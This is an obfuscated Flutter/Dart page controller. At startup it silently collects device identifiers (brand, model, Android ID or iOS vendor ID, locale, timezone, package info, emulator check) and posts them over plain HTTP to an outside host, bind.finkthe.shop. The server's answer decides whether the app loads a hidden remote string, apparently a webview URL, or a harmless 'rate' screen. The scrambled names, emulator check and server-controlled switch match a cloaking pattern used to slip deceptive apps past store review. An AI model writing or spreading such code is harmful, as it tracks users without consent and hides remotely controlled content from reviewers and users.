import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/notFound");
  }
}

class PageLogic extends GetxController {

  var suamxfqr = RxBool(false);
  var repvfzyw = RxBool(true);
  var xjhqnvbl = RxString("");
  var katheryn = RxBool(false);
  var carroll = RxBool(true);
  final mqkulxcab = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkConnect();
    super.onInit();
    gctw();
  }


  Future<void> gctw() async {

    katheryn.value = true;
    carroll.value = true;
    repvfzyw.value = false;

    mqkulxcab.post("http://bind.finkthe.shop/kzyudjpsvhqoerbctxagwnlmfi",data: await fvpwri()).then((value) {
      var vkjsymr = value.data["vkjsymr"] as String;
      var xdoqf = value.data["xdoqf"] as bool;
      if (xdoqf) {
        xjhqnvbl.value = vkjsymr;
        alexandro();
      } else {
        wiegand();
      }
    }).catchError((e) {
      repvfzyw.value = true;
      carroll.value = true;
      katheryn.value = false;
    });
  }

  Future<Map<String, dynamic>> fvpwri() async {
    final DeviceInfoPlugin bfxjk = DeviceInfoPlugin();
    PackageInfo gejpb_zxlfs = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pwmnxlsv = Platform.localeName;
    var wzcnm_yZjrhneP = currentTimeZone;

    var wzcnm_RZF = gejpb_zxlfs.packageName;
    var wzcnm_YcSyTKlb = gejpb_zxlfs.version;
    var wzcnm_ZyNJKQIS = gejpb_zxlfs.buildNumber;

    var wzcnm_CatopYne = gejpb_zxlfs.appName;
    var wzcnm_bhq  = "";
    var daijaGaylord = "";
    var raeHeller = "";
    var wzcnm_XEjnqDhk = "";
    var bartonGibson = "";
    var zariaBednar = "";
    var adamEmmerich = "";


    var wzcnm_CetZYJRG = "";
    var wzcnm_yPvObW = "";
    var wzcnm_BVh = false;

    if (GetPlatform.isAndroid) {
      wzcnm_yPvObW = "android";
      var tqnauxmk = await bfxjk.androidInfo;

      wzcnm_XEjnqDhk = tqnauxmk.brand;

      wzcnm_CetZYJRG  = tqnauxmk.model;
      wzcnm_bhq = tqnauxmk.id;

      wzcnm_BVh = tqnauxmk.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wzcnm_yPvObW = "ios";
      var khbjrvng = await bfxjk.iosInfo;
      wzcnm_XEjnqDhk = khbjrvng.name;
      wzcnm_CetZYJRG = khbjrvng.model;

      wzcnm_bhq = khbjrvng.identifierForVendor ?? "";
      wzcnm_BVh  = khbjrvng.isPhysicalDevice;
    }
    var res = {
      "wzcnm_ZyNJKQIS": wzcnm_ZyNJKQIS,
      "wzcnm_XEjnqDhk": wzcnm_XEjnqDhk,
      "wzcnm_RZF": wzcnm_RZF,
      "wzcnm_CetZYJRG": wzcnm_CetZYJRG,
      "wzcnm_yZjrhneP": wzcnm_yZjrhneP,
      "wzcnm_BVh": wzcnm_BVh,
      "wzcnm_bhq": wzcnm_bhq,
      "pwmnxlsv": pwmnxlsv,
      "wzcnm_yPvObW": wzcnm_yPvObW,
      "wzcnm_YcSyTKlb": wzcnm_YcSyTKlb,
      "bartonGibson" : bartonGibson,
      "zariaBednar" : zariaBednar,
      "adamEmmerich" : adamEmmerich,
      "wzcnm_CatopYne": wzcnm_CatopYne,
      "daijaGaylord" : daijaGaylord,
      "raeHeller" : raeHeller,

    };
    return res;
  }

  Future<void> wiegand() async {
    Get.offAllNamed("/rateTab");
  }

  Future<void> alexandro() async {
    Get.offAllNamed("/rateEval");
  }

}
